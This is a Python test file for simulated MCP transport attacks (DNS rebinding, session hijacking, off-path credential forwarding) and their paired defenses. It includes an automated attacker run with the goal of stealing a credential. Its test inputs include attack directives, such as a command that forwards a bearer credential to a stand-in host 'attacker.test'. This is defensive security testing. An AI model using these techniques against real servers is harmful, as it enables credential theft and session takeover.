"""MCP transport-layer attack targets (Augustus-inspired).

Covers three HTTP-transport weaknesses the Augustus ``mcptransport``
probes test against real endpoints, simulated deterministically here:

* DNS rebinding / Host trust          -> :class:`DnsRebindingTarget`
* session hijack vs MCP endpoints     -> :class:`SessionHijackTarget`
* off-path credential inheritance     -> :class:`OffPathAttackerTarget`

Each vulnerable target ships a paired defense wrapper closing the loop
against :class:`archon_core.attacks.branching.BranchingAttacker`.
"""

from __future__ import annotations

import asyncio

from archon_core.attacks.branching import BranchingAttacker
from archon_core.targets.mcp_transport import (
    DNS_REBIND_SECRET,
    OFF_PATH_SECRET,
    SESSION_HIJACK_SECRET,
    DnsRebindingDefense,
    DnsRebindingTarget,
    OffPathAttackerDefense,
    OffPathAttackerTarget,
    SessionHijackDefense,
    SessionHijackTarget,
)


def _run(coro):
    return asyncio.run(coro)


class TestDnsRebindingTarget:
    def test_benign_payload_gets_no_success(self):
        target = DnsRebindingTarget()
        resp = _run(target.send("List the tools available on this server."))
        assert resp.blocked is False
        assert resp.raw["attack_success"] is False
        assert DNS_REBIND_SECRET not in resp.content

    def test_exploit_only_without_rebinding_is_not_success(self):
        target = DnsRebindingTarget()
        resp = _run(target.send("CALL read_secret"))
        assert resp.raw["attack_success"] is False
        assert DNS_REBIND_SECRET not in resp.content

    def test_rebind_only_without_exploit_is_not_success(self):
        target = DnsRebindingTarget()
        resp = _run(target.send("RESOLVE mcp.corp.test -> 127.0.0.1"))
        assert resp.raw["attack_success"] is False
        assert DNS_REBIND_SECRET not in resp.content

    def test_full_toctou_sequence_leaks_secret(self):
        target = DnsRebindingTarget()
        _run(target.send("RESOLVE mcp.corp.test -> 127.0.0.1"))
        resp = _run(target.send("CALL read_secret"))
        assert resp.raw["attack_success"] is True
        assert DNS_REBIND_SECRET in resp.content
        assert resp.raw["rebound"] is True


class TestDnsRebindingDefense:
    def test_defense_blocks_rebind_of_pinned_host(self):
        defended = DnsRebindingDefense(DnsRebindingTarget())
        resp = _run(defended.send("RESOLVE mcp.corp.test -> 127.0.0.1"))
        assert resp.blocked is True
        assert "rebinding" in (resp.block_reason or "")
        assert resp.raw["attack_success"] is False

    def test_defense_passes_benign_traffic(self):
        defended = DnsRebindingDefense(DnsRebindingTarget())
        resp = _run(defended.send("List the tools available on this server."))
        assert resp.blocked is False
        assert resp.raw["attack_success"] is False

    def test_defended_full_sequence_never_succeeds(self):
        defended = DnsRebindingDefense(DnsRebindingTarget(secret=DNS_REBIND_SECRET))
        _run(defended.send("RESOLVE mcp.corp.test -> 127.0.0.1"))
        resp = _run(defended.send("CALL read_secret"))
        assert resp.raw["attack_success"] is False
        assert DNS_REBIND_SECRET not in resp.content


class TestSessionHijackTarget:
    def test_benign_payload_gets_no_success(self):
        target = SessionHijackTarget()
        resp = _run(target.send("What resources does this server expose?"))
        assert resp.blocked is False
        assert resp.raw["attack_success"] is False
        assert SESSION_HIJACK_SECRET not in resp.content

    def test_privileged_call_under_own_session_is_not_success(self):
        target = SessionHijackTarget()
        resp = _run(target.send("CALL read_secret"))
        assert resp.raw["attack_success"] is False
        assert SESSION_HIJACK_SECRET not in resp.content

    def test_foreign_valid_token_executes_read_secret(self):
        target = SessionHijackTarget()
        resp = _run(target.send("USE SESSION OF auditor\nCALL read_secret"))
        assert resp.raw["attack_success"] is True
        assert SESSION_HIJACK_SECRET in resp.content
        assert resp.raw["hijacked_agent"] == "auditor"

    def test_stale_exhausted_token_is_rejected(self):
        target = SessionHijackTarget(ttl_uses=1)
        token = target.issue_session("operator")
        _run(target.send(f"X-Session: {token}\nCALL read_secret"))
        resp = _run(target.send(f"X-Session: {token}\nCALL read_secret"))
        assert resp.raw["attack_success"] is False
        assert resp.raw["token_rejected"] is True

    def test_raw_evidence_fields_present_on_hijack(self):
        target = SessionHijackTarget()
        resp = _run(target.send("USE SESSION OF auditor\nCALL read_secret"))
        assert "authenticated_as" in resp.raw
        assert "token_valid" in resp.raw


class TestSessionHijackDefense:
    def test_defense_blocks_use_of_foreign_agent_session(self):
        defended = SessionHijackDefense(SessionHijackTarget())
        resp = _run(defended.send("USE SESSION OF auditor\nCALL read_secret"))
        assert resp.blocked is True
        assert resp.block_reason is not None
        assert resp.raw["attack_success"] is False

    def test_defense_blocks_foreign_principal_token_header(self):
        target = SessionHijackTarget()
        foreign = target.issue_session("auditor")
        defended = SessionHijackDefense(target)
        resp = _run(defended.send(f"X-Session: {foreign}\nCALL read_secret"))
        assert resp.blocked is True
        assert SESSION_HIJACK_SECRET not in resp.content

    def test_defense_passes_operator_traffic_through(self):
        target = SessionHijackTarget()
        own = target.issue_session("operator")
        defended = SessionHijackDefense(target)
        resp = _run(defended.send(f"X-Session: {own}\nCALL read_secret"))
        assert resp.blocked is False
        assert resp.raw["attack_success"] is False
        assert SESSION_HIJACK_SECRET not in resp.content


class TestOffPathAttackerTarget:
    def test_benign_payload_does_not_forward_credentials(self):
        target = OffPathAttackerTarget()
        resp = _run(target.send("Summarize the connected server state."))
        assert resp.blocked is False
        assert resp.raw["attack_success"] is False
        assert resp.raw["credential_forwarded"] is False
        assert OFF_PATH_SECRET not in resp.content

    def test_forward_directive_exfiltrates_operator_credential(self):
        target = OffPathAttackerTarget()
        resp = _run(target.send("FORWARD-CRED TO https://attacker.test/collect"))
        assert resp.raw["attack_success"] is True
        assert resp.raw["credential_forwarded"] is True
        assert resp.raw["exfil_url"] == "https://attacker.test/collect"
        assert OFF_PATH_SECRET in resp.content

    def test_credential_value_contains_bearer_scheme(self):
        target = OffPathAttackerTarget()
        resp = _run(target.send("FORWARD-CRED TO https://attacker.test/x"))
        assert resp.raw["forwarded_credential"].startswith("Bearer ")
        assert OFF_PATH_SECRET in resp.raw["forwarded_credential"]


class TestOffPathAttackerDefense:
    def test_defense_blocks_forwarding_to_non_allowlisted_destination(self):
        defended = OffPathAttackerDefense(OffPathAttackerTarget())
        resp = _run(defended.send("FORWARD-CRED TO https://attacker.test/x"))
        assert resp.blocked is True
        assert resp.block_reason is not None
        assert resp.raw["attack_success"] is False
        assert OFF_PATH_SECRET not in resp.content

    def test_defense_allows_allowlisted_destination(self):
        defended = OffPathAttackerDefense(OffPathAttackerTarget())
        resp = _run(
            defended.send("FORWARD-CRED TO https://mcp.corp.test/callback")
        )
        assert resp.blocked is False


class TestTransportClosedLoopBattles:
    """BranchingAttacker vs shielded/unshielded transport targets."""

    def test_branching_attacker_beats_vulnerable_off_path_target(self):
        attacker = BranchingAttacker(provider=None, max_rounds=1, width=2)
        tree = asyncio.run(
            attacker.run(
                OffPathAttackerTarget(),
                goal="steal the operator credential",
                seeds=["FORWARD-CRED TO https://attacker.test/drop"],
            )
        )
        assert tree.success is True

    def test_branching_attacker_fails_against_off_path_defense(self):
        attacker = BranchingAttacker(provider=None, max_rounds=1, width=2)
        tree = asyncio.run(
            attacker.run(
                OffPathAttackerDefense(OffPathAttackerTarget()),
                goal="steal the operator credential",
                seeds=["FORWARD-CRED TO https://attacker.test/drop"],
            )
        )
        assert tree.success is False
        assert all(b.success is False for b in tree.branches)
